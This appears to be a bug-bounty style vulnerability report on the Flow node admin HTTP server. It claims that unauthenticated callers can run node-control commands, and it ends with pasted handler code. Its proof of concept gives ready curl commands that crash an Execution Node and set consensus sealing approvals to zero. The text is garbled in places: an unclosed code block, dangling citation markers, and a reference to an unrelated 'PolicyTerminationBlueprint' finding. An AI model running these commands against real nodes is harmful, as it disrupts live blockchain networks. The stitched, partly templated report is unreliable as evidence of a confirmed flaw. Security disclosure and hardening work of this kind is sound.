### Title
Unauthenticated Admin HTTP Server Allows Any Network-Reachable Caller to Invoke Sensitive Node-Control Commands - (`admin/command_runner.go`)

### Summary
The Flow node admin HTTP server (`admin/command_runner.go`) exposes all registered admin commands — including `stop-at-height` (crash an Execution Node) and `set-config` (modify live consensus parameters such as `consensus-required-approvals-for-sealing`) — over plain HTTP with no caller authentication when mutual TLS is not configured. TLS is entirely optional and off by default. Any network-reachable entity that can POST to the admin port can invoke these commands without any credential or identity check, directly mirroring the missing-access-control pattern in the reported `PolicyTerminationBlueprint` finding.

### Finding Description

**Root cause — `admin/command_runner.go`**

`runCommand` dispatches every incoming request to the registered handler with no caller-identity check:

```go
func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
    req := &CommandRequest{Data: data}
    if validator := r.getValidator(command); validator != nil {
        // only validates *input shape*, never the caller's identity
        ...
    }
    if handler := r.getHandler(command); handler != nil {
        handleResult, handleErr = handler(ctx, req)
    }
    ...
}

`stop-at-height` (Execution Node) — crashes the node when `crash: true`: [5](#0-4)

**Ledger Service admin server — no authentication at all**

`cmd/ledger/admin.go` implements a standalone HTTP admin server with zero authentication. The README explicitly documents binding it to `0.0.0.0:9003`. The `handleCommand` function accepts any POST with no identity check: [8](#0-7) [9](#0-8) 

### Impact Explanation

An attacker who can reach the admin HTTP port (e.g., when `--admin-addr` is bound to a non-loopback address, or when the port is exposed via Docker/Kubernetes port mapping) can:

1. **Crash an Execution Node** by sending `{"commandName":"stop-at-height","data":{"height":1,"crash":true}}` — halting block execution for that node.
2. **Reduce consensus sealing security** on a Consensus Node by sending `{"commandName":"set-config","data":{"consensus-required-approvals-for-sealing":0}}` — causing the node to seal blocks without waiting for verification approvals, an unauthorized protocol-state mutation.
3. **Disable transaction rate limiting** on a Collection Node via `ingest-tx-rate-limit`, enabling mempool spam.

These are unauthorized state changes and integrity failures on live protocol nodes, matching the target scope of the original report.

### Likelihood Explanation

The admin server is a production feature documented for use in localnet and integration tests with network-accessible addresses. In containerized deployments (Docker/Kubernetes), the admin port is routinely mapped to host ports (the localnet README shows `0.0.0.0:6100->9002/tcp`). The ledger service admin has no TLS option at all and is explicitly documented with `0.0.0.0:9003`. Any attacker with network access to the admin port — including a co-tenant in a shared cloud environment or a misconfigured firewall — can exploit this without any credentials.

### Recommendation

1. **Require authentication by default**: The admin HTTP server should reject all requests unless the caller presents a valid client certificate (mutual TLS). TLS should be the default, not opt-in.
2. **Bind to loopback by default**: The default value of `--admin-addr` should be `127.0.0.1:9002`, not an unspecified address.
3. **Add authentication to the ledger service admin**: `cmd/ledger/admin.go` has no TLS option at all; add mutual TLS support mirroring the main admin framework.
4. **Per-command authorization**: Sensitive commands (`stop-at-height`, `set-config`) should require an additional authorization check beyond transport-layer TLS.

### Proof of Concept

With the admin server bound to `0.0.0.0:9002` and no TLS configured (default when cert flags are omitted):

```bash
# Crash an Execution Node — no credentials required
curl -s http://<EN_IP>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName":"stop-at-height","data":{"height":1,"crash":true}}'
# Response: {"output":"ok"}  — node crashes at next block finalization

# Reduce consensus sealing approvals to zero on a Consensus Node
curl -s http://<CN_IP>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName":"set-config","data":{"consensus-required-approvals-for-sealing":0}}'
# Response: {"output":{"oldValue":1,"newValue":0}}

# Trigger ledger checkpoint on the ledger service (no auth at all)
curl -s http://<LEDGER_IP>:9003/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName":"trigger-checkpoint","data":{}}'
# Response: {"output":"ok"}
```

func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
	r.logger.Info().Str("command", command).Msg("received new command")

	req := &CommandRequest{Data: data}

	if validator := r.getValidator(command); validator != nil {
		if validationErr := validator(req); validationErr != nil {
			// for expected validation errors, return code InvalidArgument and the error text
			if IsInvalidAdminParameterError(validationErr) {
				return nil, status.Error(codes.InvalidArgument, validationErr.Error())
			}
			// for unexpected errors, return code Internal and log a warning
			r.logger.Err(validationErr).Msg("unexpected error validating admin request")
			return nil, status.Error(codes.Internal, validationErr.Error())
		}
	}

	var handleResult any
	var handleErr error

	if handler := r.getHandler(command); handler != nil {
		if handleResult, handleErr = handler(ctx, req); handleErr != nil {
			if errors.Is(handleErr, context.Canceled) {
				return nil, status.Error(codes.Canceled, "client canceled")
			} else if errors.Is(handleErr, context.DeadlineExceeded) {
				return nil, status.Error(codes.DeadlineExceeded, "request timed out")
			} else {
				r.logger.Err(handleErr).Msg("unexpected error handling admin request")
				s, _ := status.FromError(handleErr)
				return nil, s.Err()
			}
		}
	} else {
		return nil, status.Error(codes.Unimplemented, "invalid command")
	}

	return handleResult, nil
}

func (h *adminHandler) handleCommand(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != http.MethodPost {
		h.writeError(w, http.StatusMethodNotAllowed, "method not allowed, use POST")
		return
	}

	var req adminRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.writeError(w, http.StatusBadRequest, fmt.Sprintf("invalid JSON: %v", err))
		return
	}

	h.logger.Info().Str("command", req.CommandName).Msg("received admin command")

	var result any

	switch req.CommandName {
	case "ping":
		result = "pong"

	case "list-commands":
		result = h.commands

	case "trigger-checkpoint":
		if h.triggerCheckpoint.CompareAndSwap(false, true) {
			h.logger.Info().Msg("trigger checkpoint as soon as finishing writing the current segment file")
			result = "ok"
		} else {
			result = "checkpoint already triggered"
		}

	default:
		h.writeError(w, http.StatusBadRequest, fmt.Sprintf("unknown command: %s", req.CommandName))
		return
	}

	h.writeSuccess(w, result)
}
